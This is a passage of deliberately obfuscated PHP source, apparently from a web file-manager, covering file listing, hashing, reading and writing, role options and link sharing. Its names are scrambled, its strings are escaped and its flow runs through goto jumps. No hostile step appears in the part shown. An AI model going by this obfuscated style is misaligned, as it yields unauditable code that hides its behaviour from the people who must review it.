$this->getPathOuter($¼‘ÎÅÃÛ), $”·ëàĞš[33] => $”·ëàĞš[194], $”·ëàĞš[80] => $this->size($¼‘ÎÅÃÛ), $”·ëàĞš[169] => $this->ext($®éàÊ•´)); } $‰ÎğŞš  = array($”·ëàĞš[32] => $®éàÊ•´, $”·ëàĞš[78] => $this->getPathOuter($¼‘ÎÅÃÛ), $”·ëàĞš[33] => $”·ëàĞš[194], $”·ëàĞš[195] => @filectime($¼‘ÎÅÃÛ), $”·ëàĞš[86] => @filemtime($¼‘ÎÅÃÛ), $”·ëàĞš[1364] => @fileatime($¼‘ÎÅÃÛ), $”·ëàĞš[80] => $this->size($¼‘ÎÅÃÛ), $”·ëàĞš[169] => $this->ext($®éàÊ•´), $”·ëàĞš[1365] => is_readable($¼‘ÎÅÃÛ), $”·ëàĞš[1366] => is_writable($¼‘ÎÅÃÛ), $”·ëàĞš[1367] => get_mode($¼‘ÎÅÃÛ)); return $‰ÎğŞš ; } public function exist($È·ÏÆ™) { $È·ÏÆ™ = $this->iconvSystem($È·ÏÆ™); return @file_exists($È·ÏÆ™); } public function isFile($“ÔÖß¯) { $“ÔÖß¯ = $this->iconvSystem($“ÔÖß¯); return @is_file($“ÔÖß¯); } public function isFolder($½ÄùÃœÅ) { $½ÄùÃœÅ = $this->iconvSystem($½ÄùÃœÅ); return @is_dir($½ÄùÃœÅ); } public function listPath($ŒÜ¥ÍÁ°, $õƒ‰×æ© = false) { $­Í¶Œ¯Å =& $_SERVER[ê‘³Æ±]; $ŒÜ¥ÍÁ° = $this->iconvSystem($ŒÜ¥ÍÁ°); $ŒÜ¥ÍÁ° = rtrim($ŒÜ¥ÍÁ°, $­Í¶Œ¯Å[8]) . $­Í¶Œ¯Å[8]; $Í¢ÓØ¡ = array($­Í¶Œ¯Å[77] => array(), $­Í¶Œ¯Å[76] => array()); if (!($Ç×œ¹¼ò = @opendir($ŒÜ¥ÍÁ°))) { return $Í¢ÓØ¡; } while (($€ó¡ß­û = readdir($Ç×œ¹¼ò)) !== !1) { if ($€ó¡ß­û == $­Í¶Œ¯Å[10] || $€ó¡ß­û == $­Í¶Œ¯Å[1361]) { continue; } $Ö–Îş‰æ = $ŒÜ¥ÍÁ° . $€ó¡ß­û; if (is_file($Ö–Îş‰æ)) { $Í¢ÓØ¡[$­Í¶Œ¯Å[76]][] = $this->fileInfo($Ö–Îş‰æ, $õƒ‰×æ©); } else { $Í¢ÓØ¡[$­Í¶Œ¯Å[77]][] = $this->folderInfo($Ö–Îş‰æ, $õƒ‰×æ©); } } closedir($Ç×œ¹¼ò); return $Í¢ÓØ¡; } public function listAll($ášŸê•ê, &$ÕğÆÎïƒ = array()) { $¢òŞÊã =& $_SERVER[ê‘³Æ±]; $ášŸê•ê = $this->iconvSystem($ášŸê•ê); $ášŸê•ê = rtrim($ášŸê•ê, $¢òŞÊã[8]) . $¢òŞÊã[8]; if (!($ŞÈ‡œ²î = @opendir($ášŸê•ê))) { return $ÕğÆÎïƒ; } while (($ÇØ¡Ğ = readdir($ŞÈ‡œ²î)) !== !1) { if ($ÇØ¡Ğ == $¢òŞÊã[10] || $ÇØ¡Ğ == $¢òŞÊã[1361]) { continue; } $Ãğ—ŠÆÕ = $ášŸê•ê . $ÇØ¡Ğ; if (is_dir($Ãğ—ŠÆÕ) && !is_link($Ãğ—ŠÆÕ)) { $ÕğÆÎïƒ[] = array($¢òŞÊã[78] => $Ãğ—ŠÆÕ . $¢òŞÊã[8], $¢òŞÊã[79] => 1, $¢òŞÊã[86] => @filemtime($Ãğ—ŠÆÕ), $¢òŞÊã[80] => 0); $this->listAll($Ãğ—ŠÆÕ, $ÕğÆÎïƒ); } else { $ÕğÆÎïƒ[] = array($¢òŞÊã[78] => $Ãğ—ŠÆÕ, $¢òŞÊã[79] => 0, $¢òŞÊã[86] => @filemtime($Ãğ—ŠÆÕ), $¢òŞÊã[80] => $this->size($Ãğ—ŠÆÕ)); } } closedir($ŞÈ‡œ²î); return $ÕğÆÎïƒ; } public function has($ÔÆı…´, $ø÷¼İŞß = false, $š¬Ú¿ÜÈ = true) { $Ô–Ú…Èß =& $_SERVER[ê‘³Æ±]; $ÔÆı…´ = $this->iconvSystem($ÔÆı…´); $ÔÆı…´ = rtrim($ÔÆı…´, $Ô–Ú…Èß[8]) . $Ô–Ú…Èß[8]; if (!($Š˜õÌÓ = @opendir($ÔÆı…´))) { return !1; } $Ìß…ñ£ = 0; $œ“—‘·ì = 0; $Í™Ã¥Úˆ = 0; while (($ş™È¤èÏ = readdir($Š˜õÌÓ)) !== !1) { if ($ş™È¤èÏ == $Ô–Ú…Èß[10] || $ş™È¤èÏ == $Ô–Ú…Èß[1361]) { continue; } $ÎÜÃÕ„Š = $ÔÆı…´ . $ş™È¤èÏ; if ($ø÷¼İŞß) { $Í™Ã¥Úˆ++; if (@is_file($ÎÜÃÕ„Š)) { $Ìß…ñ£++; } else { $œ“—‘·ì++; } if ($Í™Ã¥Úˆ > 10000) { break; } continue; } if ($š¬Ú¿ÜÈ) { if (@is_file($ÎÜÃÕ„Š)) { return !0; } } else { if (@is_dir($ÎÜÃÕ„Š . $Ô–Ú…Èß[8])) { return !0; } } } closedir($Š˜õÌÓ); if ($ø÷¼İŞß) { return array($Ô–Ú…Èß[204] => $Ìß…ñ£, $Ô–Ú…Èß[205] => $œ“—‘·ì); } return !1; } public function hashSimple($›‰¸úÉ¦) { $êˆÍĞ£û =& $_SERVER[ê‘³Æ±]; if (!$›‰¸úÉ¦) { return md5($êˆÍĞ£û[12]); } $›‰¸úÉ¦ = $this->iconvSystem($›‰¸úÉ¦); $”ü›œË = $this->size($›‰¸úÉ¦); $íˆ§ÅÖ÷ = 200; $¾½úµ¥¤ = 50; if ($”ü›œË <= $íˆ§ÅÖ÷ * $¾½úµ¥¤) { return $this->hashMd5($›‰¸úÉ¦) . $”ü›œË; } $Š„°Ÿ¡ = $êˆÍĞ£û[12]; $­‡óÜ¸™ = intval($”ü›œË / $¾½úµ¥¤); $šÚú›ú· = fopen($›‰¸úÉ¦, $êˆÍĞ£û[1368]); if (!$šÚú›ú·) { return $Š„°Ÿ¡; } for ($ñ™Ÿ²” = 0; $ñ™Ÿ²” < $¾½úµ¥¤; $ñ™Ÿ²”++) { fseek_64($šÚú›ú·, $­‡óÜ¸™ * $ñ™Ÿ²”); $Š„°Ÿ¡ .= fread($šÚú›ú·, $íˆ§ÅÖ÷); } fseek_64($šÚú›ú·, $”ü›œË - $íˆ§ÅÖ÷); $Š„°Ÿ¡ .= fread($šÚú›ú·, $íˆ§ÅÖ÷); fclose($šÚú›ú·); return md5($Š„°Ÿ¡) . $”ü›œË; } public function getContent($˜Æ½Îˆ) { $˜Æ½Îˆ = $this->iconvSystem($˜Æ½Îˆ); return file_get_contents($˜Æ½Îˆ); } public function setContent($Ğ·ÜÛ‹¨, $­ ĞÉˆ´ = '') { $Ğ·ÜÛ‹¨ = $this->iconvSystem($Ğ·ÜÛ‹¨); $æ‰‚Ë½ª = @file_put_contents($Ğ·ÜÛ‹¨, $­ ĞÉˆ´, LOCK_EX); clearstatcache(); @chmod($Ğ·ÜÛ‹¨, $this->pathAuth); return $æ‰‚Ë½ª === !1 ? !1 : !0; } public function fileSubstr($Ğ¥ÙëÒ, $ÏÎ…Õ¨ = 0, $şõ¤‘¨à = false) { $¶ÙÒßˆê =& $_SERVER[ê‘³Æ±]; $Ğ¥ÙëÒ = $this->iconvSystem($Ğ¥ÙëÒ); if ($şõ¤‘¨à === !1) { $şõ¤‘¨à = $this->size($Ğ¥ÙëÒ); } if ($şõ¤‘¨à <= 0) { return $¶ÙÒßˆê[12]; } $Üêòşê = fopen($Ğ¥ÙëÒ, $¶ÙÒßˆê[1368]); if (!$Üêòşê) { return !1; } fseek_64($Üêòşê, $ÏÎ…Õ¨); $«Ù›¶ÀÅ = fread($Üêòşê, $şõ¤‘¨à); fclose($Üêòşê); return $«Ù›¶ÀÅ; } public function upload($ÇÓ°—…, $Ë°­ÇÖ¤, $®°Í–² = false, $û³âş§‚ = REPEAT_REPLACE) { if ($®°Í–²) { return $this->moveFile($Ë°­ÇÖ¤, $ÇÓ°—…); } return $this->copyFile($Ë°­ÇÖ¤, $ÇÓ°—…); } public function setModifyTime($««ñÜ”ı, $£·±ÒÆ÷ = '') { @touch($««ñÜ”ı, intval($£·±ÒÆ÷)); } public function download($ĞëØˆÀÊ, $–ÛŠèÁÊ) { return $this->iconvSystem($ĞëØˆÀÊ); } } goto a”½Ó÷œ§•; FËòÚ¥ËŠ: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\163\164\145\x6d\x5f\157\160\x74\151\157\x6e"; protected $jsonField = array("\155\x65\156\x75", "\162\x6f\x6c\145", "\x72\157\x6c\145\107\162\x6f\165\160", "\x72\x65\x67\151\x73\164", "\145\155\x61\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($ÀÃ›ÄËº) { return "\123\x79\x73\164\145\x6d\x4f\x70\x74\x69\x6f\156\137{$ÀÃ›ÄËº}"; } protected function optionDefault($½¿¼½½ö = '') { $ãÑÈ´Ú€ =& $_SERVER[ê‘³Æ±]; if ($½¿¼½½ö == $ãÑÈ´Ú€[12]) { return $GLOBALS[$ãÑÈ´Ú€[6]][$ãÑÈ´Ú€[378]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\x72\157\x6c\145\x4c\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\141\165\164\x68", "\x6c\141\142\x65\154", "\144\151\x73\x70\154\x61\171", "\163\171\x73\x74\145\155", "\144\x65\163\x63", "\151\x67\x6e\x6f\x72\x65\105\x78\x74", "\x69\x67\x6e\157\162\x65\106\151\x6c\145\123\x69\x7a\145", "\x61\144\x6d\x69\x6e\151\163\x74\x72\141\164\157\x72", "\x73\x6f\x72\x74"); public function listData($å²œ¥„ã = false, $Ì¨¢Ç­É = "\163\x6f\162\164", $Ğ–˜­Ú¼ = false) { $™¡–¨’ =& $_SERVER[ê‘³Æ±]; $‰²ôú«ğ = parent::listData($å²œ¥„ã, $Ì¨¢Ç­É, $Ğ–˜­Ú¼); if (!$å²œ¥„ã) { foreach ($‰²ôú«ğ as $‰İĞÈêÇ => $„š°ä‹Æ) { if ($„š°ä‹Æ[$™¡–¨’[2002]] == 1) { $‰²ôú«ğ[$‰İĞÈêÇ][$™¡–¨’[444]] = LNG($™¡–¨’[2230]); } } } return $‰²ôú«ğ; } public function update($Õ„Ø„É², $· Æ÷œ) { $Ô…³§ĞÃ =& $_SERVER[ê‘³Æ±]; $€Ø­ƒÓÏ = parent::listData($Õ„Ø„É²); $Â°¨¥Éœ = $this->findByName($· Æ÷œ[$Ô…³§ĞÃ[32]]); if (!$€Ø­ƒÓÏ || $Â°¨¥Éœ && $Â°¨¥Éœ[$Ô…³§ĞÃ[394]] != $€Ø­ƒÓÏ[$Ô…³§ĞÃ[394]]) { return !1; } if ($Â°¨¥Éœ[$Ô…³§ĞÃ[2002]] == 1) { $· Æ÷œ = array($Ô…³§ĞÃ[32] => $· Æ÷œ[$Ô…³§ĞÃ[32]], $Ô…³§ĞÃ[1831] => $· Æ÷œ[$Ô…³§ĞÃ[1831]]); } $this->filterAuth($· Æ÷œ[$Ô…³§ĞÃ[407]]); return parent::update($Õ„Ø„É², $· Æ÷œ); } public function remove($°•áŸì) { $—Ìùû°å = parent::listData($°•áŸì); if (!$—Ìùû°å || $—Ìùû°å[$_SERVER[ê‘³Æ±][1263]]) { return !1; } return parent::remove($°•áŸì); } public function add($‹ÆºÌÏ¦) { $¤Áóì¤³ =& $_SERVER[ê‘³Æ±]; $÷º×½èª = $‹ÆºÌÏ¦[$¤Áóì¤³[32]]; if ($this->findByName($÷º×½èª)) { return !1; } $½Ñ¢Ùê = array($¤Áóì¤³[414] => $÷º×½èª, $¤Áóì¤³[1815] => $¤Áóì¤³[12], $¤Áóì¤³[1811] => $¤Áóì¤³[1819], $¤Áóì¤³[2231] => 1, $¤Áóì¤³[1814] => 0, $¤Áóì¤³[2232] => 0, $¤Áóì¤³[1813] => $this->getSort()); $‹ÆºÌÏ¦ = array_merge($½Ñ¢Ùê, $‹ÆºÌÏ¦); $this->filterAuth($‹ÆºÌÏ¦[$¤Áóì¤³[407]]); return parent::insert($‹ÆºÌÏ¦); } private function getSort() { $«íİ‹à¼ =& $_SERVER[ê‘³Æ±]; $•¡ŠæƒË = parent::listData(); $ı’ îÒÃ = array_to_keyvalue($•¡ŠæƒË, $«íİ‹à¼[12], $«íİ‹à¼[1832]); return empty($ı’ îÒÃ) ? 0 : max($ı’ îÒÃ) + 1; } private function filterAuth(&$‘‘ÓÖÅø) { $îÆÑ”ºÕ =& $_SERVER[ê‘³Æ±]; $¨°áÎâë = array(); $ÚÂÕ”½Ë = array_filter(explode($îÆÑ”ºÕ[50], $‘‘ÓÖÅø)); foreach ($ÚÂÕ”½Ë as $‘‘ÓÖÅø) { $À—Ì’Ö† = explode($îÆÑ”ºÕ[10], $‘‘ÓÖÅø); if ($À—Ì’Ö†[0] == $îÆÑ”ºÕ[2233] && $À—Ì’Ö†[1] != $îÆÑ”ºÕ[1182]) { $·…ÇŞÆû = $À—Ì’Ö†[0] . $îÆÑ”ºÕ[10] . $À—Ì’Ö†[1] . $îÆÑ”ºÕ[2234]; if (!in_array($·…ÇŞÆû, $ÚÂÕ”½Ë)) { $¨°áÎâë[] = $·…ÇŞÆû; } } $¨°áÎâë[] = $‘‘ÓÖÅø; } $‘‘ÓÖÅø = implode($îÆÑ”ºÕ[50], $¨°áÎâë); } public function sort($öÌñû©, $íÕÉê•‘) { return parent::update($öÌñû©, $íÕÉê•‘); } } goto E³’éŠ…¾Ç; AÓ¯õ“§÷à: class ShareModel extends ModelBase { protected $tableName = "\163\x68\141\x72\x65"; protected $dataAuto = array(array("\x6d\157\x64\151\x66\171\124\x69\155\x65", "\164\151\155\x65", "\151\x6e\x73\x65\x72\x74\54\165\160\x64\141\x74\x65", "\146\165\x6e\x63\x74\x69\x6f\156"), array("\143\162\145\141\x74\x65\124\x69\155\145", "\x74\x69\x6d\145", "\x69\156\x73\145\x72\164", "\146\165\156\143\x74\x69\x6f\156"), array("\157\x70\x74\x69\x6f\x6e\x73", '', "\151\156\163\145\x72\x74\54\x75\160\144\141\164\145\54\x73\145\x6c\145\x63\164", "\x6a\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($ÇëˆèÃ‰) { $ËÈ”´å¡ =& $_SERVER[ê‘³Æ±]; $éĞììÅ‹ = isset($ÇëˆèÃ‰[0]) ? $ÇëˆèÃ‰[0] : !1; return array($ËÈ”´å¡[1943] => array(USER_ID, $ËÈ”´å¡[1944]), $ËÈ”´å¡[1888] => array($éĞììÅ‹, $ËÈ”´å¡[1945])); } protected function listSimple() { $Ãå‰Á÷œ = array($_SERVER[ê‘³Æ±][1641] => USER_ID); $“Ê‰”‹ = $this->field($this->fieldList)->where($Ãå‰Á÷œ)->select(); return $“Ê‰”‹ ? $“Ê‰”‹ : array(); } protected function getInfo($÷¬ ¶â, $Ø–€¥ûë = false) { $êş—³»» =& $_SERVER[ê‘³Æ±]; if ($Ø–€¥ûë) { return $this->_getShareInfo(array($êş—³»»[481] => $÷¬ ¶â)); } $Ü‘ëõÈ = $this->cacheFunctionGet($êş—³»»[1890], $÷¬ ¶â); return $Ü‘ëõÈ; } public function getInfoByHash($Áä‰³úÎ) { return $this->_getShareInfo(array($_SERVER[ê‘³Æ±][483] => $Áä‰³úÎ)); } public function getInfoByPath($ŠŠ•ßåî) { $¸Û‡–³Š =& $_SERVER[ê‘³Æ±]; $–¥ÎÚ• = array($¸Û‡–³Š[1641] => USER_ID, $¸Û‡–³Š[396] => $ŠŠ•ßåî); return $this->_getShareInfo($–¥ÎÚ•); } public function getInfoBySourcePath($®ú¥—éü) { $Ï ’ëá =& $_SERVER[ê‘³Æ±]; $áù÷Á = array($Ï ’ëá[1641] => USER_ID, $Ï ’ëá[1163] => $®ú¥—éü); return $this->_getShareInfo($áù÷Á); } private function _getShareInfo($í„Ó—ª‡) { $©»ÚÁÉø =& $_SERVER[ê‘³Æ±]; $ñÉëºÄ¾ = $this->where($í„Ó—ª‡)->find(); if (!$ñÉëºÄ¾) { return !1; } $í„Ó—ª‡ = array($©»ÚÁÉø[481] => $ñÉëºÄ¾[$©»ÚÁÉø[481]]); $şø ¥´Á = $©»ÚÁÉø[1946]; $èÏš¼§¹ = Model($©»ÚÁÉø[592])->order($©»ÚÁÉø[394])->field($şø ¥´Á)->where($í„Ó—ª‡)->select(); if ($ñÉëºÄ¾[$©»ÚÁÉø[396]] == $©»ÚÁÉø[192]) { $ñÉëºÄ¾[$©»ÚÁÉø[87]] = IO::info($ñÉëºÄ¾[$©»ÚÁÉø[1163]]); } else { $ñÉëºÄ¾[$©»ÚÁÉø[87]] = Model($©»ÚÁÉø[1314])->pathInfo($ñÉëºÄ¾[$©»ÚÁÉø[396]]); } $ñÉëºÄ¾[$©»ÚÁÉø[1947]] = $èÏš¼§¹; return $ñÉëºÄ¾; } protected function getInfoAuth($ˆôË·×) { $†şŸº¸ =& $_SERVER[ê‘³Æ±]; $½Åôé = $this->getInfo($ˆôË·×); if ($½Åôé[$†şŸº¸[1641]] == USER_ID) { $½Åôé[$†şŸº¸[407]] = $½Åôé[$†şŸº¸[87]][$†şŸº¸[407]]; } else { $½Åôé[$†şŸº¸[407]] = Model($†şŸº¸[495])->authMake($½Åôé[$†şŸº¸[1947]]); } return $½Åôé; } protected function listData($çššµƒ€ = null, $‰›œŠõ÷ = 300) { $®óöŒı¡ =& $_SERVER[ê‘³Æ±]; $äÎúÊëÂ = array(array($®óöŒı¡[486] => array($®óöŒı¡[1001], 0), $®óöŒı¡[488] => array($®óöŒı¡[1001], 0), $®óöŒı¡[1948] => $®óöŒı¡[1904])); if ($çššµƒ€ == $®óöŒı¡[1949]) { $äÎúÊëÂ = array($®óöŒı¡[486] => 1); } else { if ($çššµƒ€ == $®óöŒı¡[1148]) { $äÎúÊëÂ = array($®óöŒı¡[488] => 1); } } $äÎúÊëÂ[$®óöŒı¡[1641]] = USER_ID; $¼Ù€‡êÄ = $this->where($äÎúÊëÂ)->selectPage($‰›œŠõ÷); return $¼Ù€‡êÄ; } protected function listToMe($ƒÓĞ¼Š’ = 300) { $è³§Å =& $_SERVER[ê‘³Æ±]; $èÎé¬¾ï = Model($è³§Å[1950])->userGroupParents(USER_ID); $Âµ¯¤Ç‚ = array($è³§Å[576] => SourceModel::TYPE_USER, $è³§Å[498] => USER_ID); if ($èÎé¬¾ï) { $Âµ¯¤Ç‚ = array(array($è³§Å[576] => SourceModel::TYPE_USER, $è³§Å[498] => USER_ID), array($è³§Å[576] => SourceModel::TYPE_GROUP, $è³§Å[498] => array($è³§Å[7], $èÎé¬¾ï)), $è³§Å[1948] => $è³§Å[1904]); } $úÓüãŸ = Model($è³§Å[592])->where($Âµ¯¤Ç‚)->selectPage($ƒÓĞ¼Š’); $Œ°Œıèš = array_to_keyvalue_group($úÓüãŸ[$è³§Å[366]], $è³§Å[481]); if (!$Œ°Œıèš) { return $úÓüãŸ; } $Š†‘çÊ« = $è³§Å[1951]; $Âµ¯¤Ç‚ = array($è³§Å[481] => array($è³§Å[412], array_keys($Œ°Œıèš)), $è³§Å[1641] => array($è³§Å[1003], $è³§Å[192])); $ÉÑ¼¦ŸĞ = $this->field($Š†‘çÊ«)->where($Âµ¯¤Ç‚)->select(); foreach ($ÉÑ¼¦ŸĞ as $Î–º·½ã => &$àøˆøÎ¼) { $àøˆøÎ¼[$è³§Å[1947]] = $Œ°Œıèš[$àøˆøÎ¼[$è³§Å[481]]]; } unset($àøˆøÎ¼); $È‡¦ÀàÎ = array($è³§Å[1952] => $ÉÑ¼¦ŸĞ, $è³§Å[1953] => $úÓüãŸ[$è³§Å[363]]); return $È‡¦ÀàÎ; } protected function shareAdd($³ñ‘€Ÿ, $îß€€À) { $°…¼µ‹× =& $_SERVER[ê‘³Æ±]; $åÈéÖáÇ = $this->_addShareData($³ñ‘€Ÿ, $îß€€À); if (!empty($îß€€À[$°…¼µ‹×[1954]])) { $this->_shareAuthSet($åÈéÖáÇ, $îß€€À[$°…¼µ‹×[1954]]); } $this->shareEventAdd($³ñ‘€Ÿ, $îß€€À, $°…¼µ‹×[1151]); return $åÈéÖáÇ; } protected function shareAddSystem($ÓÜğü¤î, $Ç˜×˜öë) { $ç¢¨ ş =& $_SERVER[ê‘³Æ±]; $æ—¢ùıú = $this->_addShareData($ÓÜğü¤î, $Ç˜×˜öë, $ç¢¨ ş[1263]); $this->_shareAuthSet($æ—¢ùıú, $Ç˜×˜öë[$ç¢¨ ş[1954]]); return $æ—¢ùıú; } private function shareEventAdd($ĞÊö›Û´, $–õ·ÏÖá, $ÃÄ¿ù’ö = "\141\x64\x64") { $ñ‚ÒâêÛ =& $_SERVER[ê‘³Æ±]; if (!$ĞÊö›Û´ || $ĞÊö›Û´ == $ñ‚ÒâêÛ[192]) { return; } if ($ÃÄ¿ù’ö == $ñ‚ÒâêÛ[1151]) { if ($–õ·ÏÖá[$ñ‚ÒâêÛ[486]] == $ñ‚ÒâêÛ[89]) { Model($ñ‚ÒâêÛ[560])->eventShare($ĞÊö›Û´, $ñ‚ÒâêÛ[1955]); } if ($–õ·ÏÖá[$ñ‚ÒâêÛ[488]] == $ñ‚ÒâêÛ[89]) { Model($ñ‚ÒâêÛ[560])->eventShare($ĞÊö›Û´, $ñ‚ÒâêÛ[1956]); } return; } $¼–Ê‹ï = $this->getInfoByPath($ĞÊö›Û´); $°¢˜•Ôâ = $ñ‚ÒâêÛ[1957]; if ($¼–Ê‹ï[$ñ‚ÒâêÛ[486]] == $ñ‚ÒâêÛ[192] && $–õ·ÏÖá[$ñ‚ÒâêÛ[486]] == $ñ‚ÒâêÛ[89]) { $°¢˜•Ôâ = $ñ‚ÒâêÛ[1955]; } if ($¼–Ê‹ï[$ñ‚ÒâêÛ[486]] == $ñ‚ÒâêÛ[89] && $–õ·ÏÖá[$ñ‚ÒâêÛ[486]] == $ñ‚ÒâêÛ[192]) { $°¢˜•Ôâ = $ñ‚ÒâêÛ[1958]; } if ($¼–Ê‹ï[$ñ‚ÒâêÛ[488]] == $ñ‚ÒâêÛ[192] && $–õ·ÏÖá[$ñ‚ÒâêÛ[488]] == $ñ‚ÒâêÛ[89]) { $°¢˜•Ôâ = $ñ‚ÒâêÛ[1956]; } if ($¼–Ê‹ï[$ñ‚ÒâêÛ[488]] == $ñ‚ÒâêÛ[89] && $–õ·ÏÖá[$ñ‚ÒâêÛ[488]] == $ñ‚ÒâêÛ[192]) { $°¢˜•Ôâ = $ñ‚ÒâêÛ[1959]; } Model($ñ‚ÒâêÛ[560])->eventShare($ĞÊö›Û´, $°¢˜•Ôâ); return; } private function _addShareData($ÀïŒÉâƒ, $²çÛÜçµ = array(), $óø¿¯ŸÒ = false) { $ä¿¦Áùœ =& $_SERVER[ê‘³Æ±]; $Å·ÕÇ± = $óø¿¯ŸÒ == $ä¿¦Áùœ[1263] ? 0 : USER_ID; $ÏÄ ã´õ = array($ä¿¦Áùœ[411] => $ÀïŒÉâƒ, $ä¿¦Áùœ[1632] => $Å·ÕÇ±); if ($ÀïŒÉâƒ == 0) { $ÏÄ ã´õ = array($ä¿¦Áùœ[1960] => $²çÛÜçµ[$ä¿¦Áùœ[1163]], $ä¿¦Áùœ[1632] => $Å·ÕÇ±); } if ($öÍäÉõ¤ = $this->where($ÏÄ ã´õ)->find()) { return $öÍäÉõ¤[$ä¿¦Áùœ[481]]; } if ($ÀïŒÉâƒ == 0) { $Æõ“åĞ€ = array($ä¿¦Áùœ[32] => get_path_this($²çÛÜçµ[$ä¿¦Áùœ[78]])); } else { $Æõ“åĞ€ = Model($ä¿¦Áùœ[819])->sourceInfo($ÀïŒÉâƒ); if (!$Æõ“åĞ€) { return !1; } } if (!$²çÛÜçµ[$ä¿¦Áùœ[1541]]) { $²çÛÜçµ[$ä¿¦Áùœ[1541]] = $Æõ“åĞ€[$ä¿¦Áùœ[32]]; } $’—Á°æ¥ = array($ä¿¦Áùœ[1632] => $Å·ÕÇ±, $ä¿¦Áùœ[411] => $ÀïŒÉâƒ, $ä¿¦Áùœ[1541] => $ä¿¦Áùœ[12], $ä¿¦Áùœ[486] => 0, $ä¿¦Áùœ[488] => 0, $ä¿¦Áùœ[1163] => $ä¿¦Áùœ[12], $ä¿¦Áùœ[304] => $ä¿¦Áùœ[12], $ä¿¦Áùœ[878] => $ä¿¦Áùœ[12], $ä¿¦Áùœ[1961] => 0, $ä¿¦Áùœ[1962] => 0, $ä¿¦Áùœ[489] => 0, $ä¿¦Áùœ[490] => $ä¿¦Áùœ[12], $ä¿¦Áùœ[483] => $ä¿¦Áùœ[12]); $Óğõ“¦ = explode($ä¿¦Áùœ[50], $ä¿¦Áùœ[1963]); foreach ($Óğõ“¦ as $äÈ¶Û”Ó) { if (!isset($²çÛÜçµ[$äÈ¶Û”Ó])) { continue; } $’—Á°æ¥[$äÈ¶Û”Ó] = $²çÛÜçµ[$äÈ¶Û”Ó]; } $¢î°çï = $this->add($’—Á°æ¥); $”…ÃÓöˆ = array($ä¿¦Áùœ[483] => short_id($¢î°çï)); $this->where(array($ä¿¦Áùœ[480] => $¢î°çï))->save($”…ÃÓöˆ); return $¢î°çï; } private function _shareAuthSet($ÁÒêš¯, $ĞÇ—Œìª) { $¾æÄ‹´Ü =& $_SERVER[ê‘³Æ±]; if (!is_array($ĞÇ—Œìª)) { return !1; } $İ±¡Îé† = Model($¾æÄ‹´Ü[1914]); $İ±¡Îé†->where(array($¾æÄ‹´Ü[481] => $ÁÒêš¯))->delete(); $È·Ñ°ÀÈ = array(); foreach ($ĞÇ—Œìª as $™ÀöîØœ) { $©µ ÇùŞ = SourceModel::TYPE_USER; if ($™ÀöîØœ[$¾æÄ‹´Ü[405]] == SourceModel::TYPE_GROUP) { $©µ ÇùŞ = SourceModel::TYPE_GROUP; } $üçÖíó× = array($¾æÄ‹´Ü[481] => $ÁÒêš¯, $¾æÄ‹´Ü[405] => $©µ ÇùŞ, $¾æÄ‹´Ü[498] => intval($™ÀöîØœ[$¾æÄ‹´Ü[498]]), $¾æÄ‹´Ü[1910] => 0, $¾æÄ‹´Ü[1964] => -1); if ($™ÀöîØœ[$¾æÄ‹´Ü[1910]]) { $üçÖíó×[$¾æÄ‹´Ü[1910]] = $™ÀöîØœ[$¾æÄ‹´Ü[1910]]; } else { if ($™ÀöîØœ[$¾æÄ‹´Ü[1964]]) { $üçÖíó×[$¾æÄ‹´Ü[1964]] = $™ÀöîØœ[$¾æÄ‹´Ü[1964]]; } } $È·Ñ°ÀÈ[] = $üçÖíó×; } return $İ±¡Îé†->addAll($È·Ñ°ÀÈ, array(), !0); } public function numViewAdd($Ö“Ï”ÂÚ) { $í¯Ëòì =& $_SERVER[ê‘³Æ±]; $„ìßøÖ = array($í¯Ëòì[480] => $Ö“Ï”ÂÚ); $this->where($„ìßøÖ)->setAdd($í¯Ëòì[1961]); } public function numDownloadAdd($«§ÔÉ) { $îÀÖõî =& $_SERVER[ê‘³Æ±]; $½¶ÌİÚÈ = array($îÀÖõî[480] => $«§ÔÉ); $this->where($½¶ÌİÚÈ)->setAdd($îÀÖõî[1962]); } protected function shareEdit($ªëáøû‘, $Õ‘ù™üÉ) { $Ã°ˆË× =& $_SERVER[ê‘³Æ±]; $€ÅŠ‹¸ = $this->getInfo($ªëáøû‘); if (!$€ÅŠ‹¸) { return !1; } $this->_checkLinkShare($Õ‘ù™üÉ, $€ÅŠ‹¸); $Ø¢Å§÷ = array(); $Şà™İĞò = explode($Ã°ˆË×[50], $Ã°ˆË×[1965]); foreach ($Şà™İĞò as $Â¥ş ñ…) { if (!array_key_exists($Â¥ş ñ…, $Õ‘ù™üÉ)) { continue; } $Ø¢Å§÷[$Â¥ş ñ…] = $Õ‘ù™üÉ[$Â¥ş ñ…]; } $this->shareEventAdd($€ÅŠ‹¸[$Ã°ˆË×[396]], $Õ‘ù™üÉ, $Ã°ˆË×[1779]); $this->where(array($Ã°ˆË×[480] => $ªëáøû‘))->save($Ø¢Å§÷); if (isset($Õ‘ù™üÉ[$Ã°ˆË×[1954]])) { $this->_shareAuthSet($ªëáøû‘, $Õ‘ù™üÉ[$Ã°ˆË×[1954]]); } return !0; } private function _checkLinkShare($é¬ÙÙ÷´, $Ü‹şä‡) { $¹œŒõ³‘ =& $_SERVER[ê‘³Æ±]; if ($é¬ÙÙ÷´[$¹œŒõ³‘[486]] != $¹œŒõ³‘[89]) { return; } $Æ·¢¥µÕ = $Ü‹şä‡[$¹œŒõ³‘[87]][$¹œŒõ³‘[396]]; if ($Ü‹şä‡[$¹œŒõ³‘[87]][$¹œŒõ³‘[33]] != $¹œŒõ³‘[194]) { $Ö™Õ—ø = $this->_folderReport($Æ·¢¥µÕ); if (!$Ö™Õ—ø) { return; } show_json(LNG($¹œŒõ³‘[1966]) . $¹œŒõ³‘[1967] . $Ö™Õ—ø, !1); } $¯îº¿ıô = Model($¹œŒõ³‘[819])->fileInfoGet($Ü‹şä‡[$¹œŒõ³‘[87]][$¹œŒõ³‘[396]]); if (!$¯îº¿ıô) { return; } $„ˆÄĞŸ‚ = $this->shareFileMeta($¯îº¿ıô[$¹œŒõ³‘[460]]); if (isset($„ˆÄĞŸ‚[$¹œŒõ³‘[371]]) && $„ˆÄĞŸ‚[$¹œŒõ³‘[371]] == $¹œŒõ³‘[89]) { show_json(LNG($¹œŒõ³‘[1968]), !1); } } private function _folderReport($óæç…) { $Á¨óÓÖ =& $_SERVER[ê‘³Æ±]; 